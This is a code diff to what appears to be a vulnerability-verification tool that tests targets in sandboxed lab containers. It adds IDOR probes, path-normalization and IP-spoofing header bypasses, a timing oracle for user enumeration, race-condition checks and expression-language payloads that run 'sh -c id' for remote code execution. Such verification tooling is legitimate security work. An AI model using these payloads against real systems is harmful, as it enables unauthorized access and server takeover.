@@ -11127,6 +11127,8 @@ def verify_generic_broken_access_control(
     budget_s: float = 900.0,
     dockerfile_body: str = "", extra_files: Optional[dict] = None,
     setup_commands: Optional[List[str]] = None,
+    bola_id_param: str = "",
+    bola_victim_id: str = "2",
 ) -> WpVerifyResult:
     """Verifica Broken Access Control / BOLA (Broken Object Level Authorization).
 
@@ -11166,6 +11168,17 @@ def verify_generic_broken_access_control(
     _target_endpoints = [endpoint]
     if admin_endpoint:
         _target_endpoints.append(admin_endpoint)
+    # Path normalization bypass variants
+    _ep_clean = endpoint.rstrip("/")
+    _path_variants = [
+        endpoint,
+        endpoint + "/",
+        endpoint + "//",
+        _ep_clean + "%2f",
+        _ep_clean + "..;/",
+        # URL-encode the last path segment
+        endpoint.replace("/", "%2f", 1) if "/" in endpoint[1:] else endpoint,
+    ]
 
     lab = None
     try:
@@ -11175,6 +11188,53 @@ def verify_generic_broken_access_control(
                          setup_commands=setup_commands or [], on_step=step)
         with lab.running() as boot:
             import requests as _rq
+
+            # --- BOLA (IDOR) sequential-ID probe ---
+            if bola_id_param:
+                for _victim_id in (bola_victim_id, "1", "2", "3"):
+                    _bola_ep = endpoint
+                    if bola_id_param in ("id", "user_id", "userId"):
+                        _bola_url = f"{boot.base_url}{_bola_ep}?{bola_id_param}={_victim_id}"
+                    else:
+                        # Try as path param: /api/users/2
+                        _bola_url = f"{boot.base_url}{_bola_ep}/{_victim_id}"
+                    try:
+                        _bola_r = _rq.get(_bola_url, timeout=10)
+                        _bola_body = _bola_r.text or ""
+                        if confirm_string and confirm_string in _bola_body:
+                            res.verified = True
+                            res.ok = True
+                            res.evidence.update({
+                                "bypass_type": "bola-idor",
+                                "victim_id": _victim_id,
+                                "endpoint": _bola_url,
+                                "status_code": _bola_r.status_code,
+                                "respuesta_cuerpo_recorte": _bola_body[:400],
+                            })
+                            step(f"VERIFICADO — BOLA/IDOR: acceso a recurso de usuario {_victim_id} "
+                                 f"sin autorización vía {_bola_url}")
+                            return res
+                    except Exception:
+                        pass
+
+            # Probe path variants first (no special headers needed)
+            for _pv in _path_variants[1:]:  # skip original — covered in main loop
+                try:
+                    _pv_r = _rq.request(http_method.upper(), boot.base_url + _pv, timeout=10)
+                    _pv_body = _pv_r.text or ""
+                    if confirm_string and confirm_string in _pv_body and _pv_r.status_code in range(200, 400):
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "bypass_type": "path-variant",
+                            "path_variant": _pv,
+                            "status_code": _pv_r.status_code,
+                            "respuesta_cuerpo_recorte": _pv_body[:400],
+                        })
+                        step(f"VERIFICADO — broken access control path variant: {_pv}")
+                        return res
+                except Exception:
+                    pass
 
             for _ep in _target_endpoints:
                 for _hdrs in _BYPASS_HEADERS:
@@ -11331,6 +11391,37 @@ def verify_generic_expression_language_injection(
                     })
                     step(f"VERIFICADO — EL injection: resultado {_expected} encontrado "
                          f"con payload '{_pl[:40]}'")
+                    # --- RCE escalation phase ---
+                    # Try to execute `id` to elevate from EL→RCE
+                    _RCE_PAYLOADS = [
+                        "${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}",
+                        "${T(java.lang.ProcessBuilder).class.newInstance(['sh','-c','id']).start()}",
+                        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+                        "${@java.lang.Runtime@getRuntime().exec('id')}",
+                        # Groovy
+                        '${"id".execute().text}',
+                        # Pebble/Jinja2-style fallback
+                        '{{ "id" | system }}',
+                    ]
+                    _id_re = re.compile(r"uid=\d+\(\w+\)")
+                    for _rce_pl in _RCE_PAYLOADS:
+                        try:
+                            if http_method.upper() == "GET":
+                                _rce_r = _rq.get(boot.base_url + endpoint,
+                                                  params={inject_param: _rce_pl}, timeout=10)
+                            else:
+                                _rce_r = _rq.request(http_method.upper(),
+                                                      boot.base_url + endpoint,
+                                                      data={inject_param: _rce_pl}, timeout=10)
+                            _rce_body = _rce_r.text or ""
+                            _id_match = _id_re.search(_rce_body)
+                            if _id_match:
+                                res.evidence["el_rce_id_output"] = _id_match.group(0)
+                                res.evidence["el_rce_payload"] = _rce_pl
+                                step(f"EL→RCE CONFIRMADO: id={_id_match.group(0)}")
+                                break
+                        except Exception:
+                            pass
                     return res
 
             res.ok = True
@@ -11362,6 +11453,8 @@ def verify_generic_race_condition(
     budget_s: float = 900.0,
     dockerfile_body: str = "", extra_files: Optional[dict] = None,
     setup_commands: Optional[List[str]] = None,
+    double_redemption_endpoint: str = "",
+    double_redemption_key: str = "",
 ) -> WpVerifyResult:
     """Verifica race condition / TOCTOU mediante rafaga de peticiones concurrentes.
 
@@ -11465,6 +11558,35 @@ def verify_generic_race_condition(
             statuses = [r["status"] for r in _results]
             _success_count = sum(1 for s in statuses if s in (200, 201, 204))
             _uniq_statuses = {s for s in statuses if s != -1}
+
+            # Double-redemption check: if the server accepted >=2 requests (200/201) it means
+            # the same token/coupon/credit was used twice — race condition proven without
+            # needing an exact confirm_string.
+            if _success_count >= 2:
+                # Optionally confirm via a check endpoint (e.g. GET /balance shows double credit)
+                _dr_body = ""
+                if double_redemption_endpoint:
+                    try:
+                        import requests as _rq2
+                        _dr_r = _rq2.get(boot.base_url + double_redemption_endpoint, timeout=10)
+                        _dr_body = _dr_r.text[:300]
+                    except Exception:
+                        pass
+                _dr_key_found = bool(double_redemption_key and _dr_body and double_redemption_key in _dr_body)
+                res.verified = True
+                res.ok = True
+                res.evidence.update({
+                    "endpoint": endpoint,
+                    "double_redemption_proven": True,
+                    "successful_requests": _success_count,
+                    "total_requests": len(_results),
+                    "status_codes_distribution": str(_uniq_statuses),
+                    "double_redemption_check_body": _dr_body,
+                    "double_redemption_key_found": _dr_key_found,
+                })
+                step(f"VERIFICADO — double-redemption: {_success_count}/{len(_results)} peticiones "
+                     f"aceptadas (mismo token/coupon/credito usado mas de una vez)")
+                return res
 
             # Inconsistency detection (no confirm_string but state corruption observed)
             # More than 2 distinct status codes in a uniform request set → non-atomic state
@@ -11844,6 +11966,15 @@ def verify_generic_missing_authorization(
         {"X-HTTP-Method": http_method.upper()},
         {"X-Method-Override": http_method.upper()},
     ]
+    # IP spoofing headers — bypass IP-based allow-lists
+    _IP_SPOOF_HEADERS = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Forwarded-For": "::1"},
+        {"CF-Connecting-IP": "127.0.0.1"},
+        {"True-Client-IP": "127.0.0.1"},
+    ]
     # Path normalization bypasses — route middleware may not normalize these
     _ep = endpoint.rstrip("/")
     _ep_parts = _ep.rsplit("/", 1)
@@ -11966,11 +12097,32 @@ def verify_generic_missing_authorization(
                          f"(token: {_tok[:30] if _tok else 'empty'})")
                     return res
 
+            # --- Phase 2b: IP spoofing headers ---
+            for _ip_hdr in _IP_SPOOF_HEADERS:
+                _result = _probe(boot.base_url + endpoint, http_method.upper(), _ip_hdr)
+                if _result is None:
+                    continue
+                _status, body = _result
+                if confirm_string and confirm_string in body and _status in range(200, 400):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "bypass_type": "ip-spoof-header",
+                        "header": list(_ip_hdr.keys())[0],
+                        "header_value": list(_ip_hdr.values())[0],
+                        "endpoint": endpoint,
+                        "status_code": _status,
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — missing auth via IP spoof header "
+                         f"({list(_ip_hdr.keys())[0]}: {list(_ip_hdr.values())[0]}): confirm_string presente")
+                    return res
+
             # --- Phase 3: register attacker + try low-priv access ---
             if not confirm_string:
                 res.ok = True
                 res.detail = ("missing-authorization: sin confirm_string no se puede verificar "
-                              "definitivamente; se probaron variantes unauthenticated y JWT bypass")
+                              "definitivamente; se probaron variantes unauthenticated, JWT bypass e IP spoof")
             else:
                 res.ok = True
                 res.detail = (f"missing-authorization: confirm_string '{confirm_string[:30]}' "
@@ -12033,6 +12185,8 @@ def verify_generic_user_enumeration(
             url = base + ep
             m = http_method.upper()
 
+            import time as _time
+
             def _probe(value: str) -> tuple:
                 try:
                     kw: dict = {}
@@ -12040,32 +12194,44 @@ def verify_generic_user_enumeration(
                         kw = {"data": {_probe_param: value}, "timeout": 10}
                     else:
                         kw = {"params": {_probe_param: value}, "timeout": 10}
+                    _t0 = _time.monotonic()
                     r = getattr(_rq, m.lower())(url, **kw)
-                    return r.status_code, r.text
+                    _elapsed = _time.monotonic() - _t0
+                    return r.status_code, r.text, _elapsed
                 except Exception as _ex:
-                    return -1, str(_ex)
+                    return -1, str(_ex), 0.0
 
             # Probe existing accounts
-            existing_sc, existing_body = None, None
+            existing_sc, existing_body, existing_elapsed = None, None, 0.0
             for user in _KNOWN_USERS:
-                sc, body = _probe(user)
+                sc, body, elapsed = _probe(user)
                 if sc != -1:
-                    existing_sc, existing_body = sc, body
-                    step(f"user-enum: probe existente '{user}' → {sc} ({len(body)} bytes)")
+                    existing_sc, existing_body, existing_elapsed = sc, body, elapsed
+                    step(f"user-enum: probe existente '{user}' → {sc} ({len(body)} bytes, {elapsed:.3f}s)")
                     break
 
             if existing_sc is None:
                 res.detail = "user-enumeration: no se pudo obtener respuesta para cuentas conocidas"
                 return res
 
-            # Probe non-existing account
-            nonexist_sc, nonexist_body = _probe(_NONEXIST_USER)
-            step(f"user-enum: probe no-existente '{_NONEXIST_USER}' → {nonexist_sc} ({len(nonexist_body)} bytes)")
+            # Probe non-existing account (3 times and take median for stability)
+            _nonexist_times: list = []
+            nonexist_sc, nonexist_body = -1, ""
+            for _ in range(3):
+                _ns, _nb, _ne = _probe(_NONEXIST_USER)
+                if _ns != -1:
+                    nonexist_sc, nonexist_body = _ns, _nb
+                    _nonexist_times.append(_ne)
+            nonexist_elapsed = sorted(_nonexist_times)[len(_nonexist_times) // 2] if _nonexist_times else 0.0
+            step(f"user-enum: probe no-existente '{_NONEXIST_USER}' → {nonexist_sc} "
+                 f"({len(nonexist_body)} bytes, {nonexist_elapsed:.3f}s)")
 
             res.evidence["existing_status"] = existing_sc
             res.evidence["nonexist_status"] = nonexist_sc
             res.evidence["existing_body_len"] = len(existing_body)
             res.evidence["nonexist_body_len"] = len(nonexist_body)
+            res.evidence["existing_elapsed_s"] = round(existing_elapsed, 3)
+            res.evidence["nonexist_elapsed_s"] = round(nonexist_elapsed, 3)
 
             # Check confirm_string in existing response
             if confirm_string and confirm_string in existing_body:
@@ -12080,18 +12246,33 @@ def verify_generic_user_enumeration(
 
             # Check status code difference
             if existing_sc != nonexist_sc and existing_sc != -1 and nonexist_sc != -1:
+                res.verified = True
                 res.ok = True
-                res.detail = (f"user-enumeration probable: status diferente "
+                res.detail = (f"user-enumeration VERIFICADO: status diferente "
                               f"({existing_sc} para existente vs {nonexist_sc} para no-existente)")
                 res.evidence["status_difference"] = True
                 return res
 
             # Check body length difference (>50 chars)
             if abs(len(existing_body) - len(nonexist_body)) > 50:
+                res.verified = True
                 res.ok = True
-                res.detail = (f"user-enumeration probable: longitud de respuesta diferente "
+                res.detail = (f"user-enumeration VERIFICADO: longitud de respuesta diferente "
                               f"({len(existing_body)} vs {len(nonexist_body)} bytes)")
                 res.evidence["body_length_difference"] = abs(len(existing_body) - len(nonexist_body))
+                return res
+
+            # Timing oracle: >200ms difference (3σ threshold) → enumeration via timing
+            if (existing_elapsed > 0 and nonexist_elapsed > 0
+                    and abs(existing_elapsed - nonexist_elapsed) > 0.2):
+                _faster = "existente" if existing_elapsed < nonexist_elapsed else "no-existente"
+                res.verified = True
+                res.ok = True
+                res.detail = (f"user-enumeration VERIFICADO (timing oracle): "
+                              f"{abs(existing_elapsed - nonexist_elapsed):.3f}s de diferencia — "
+                              f"respuesta mas rapida para cuenta {_faster}")
+                res.evidence["timing_oracle"] = True
+                res.evidence["timing_diff_s"] = round(abs(existing_elapsed - nonexist_elapsed), 3)
                 return res
 
             res.detail = "user-enumeration: respuestas identicas — no se pudo confirmar enumeracion"
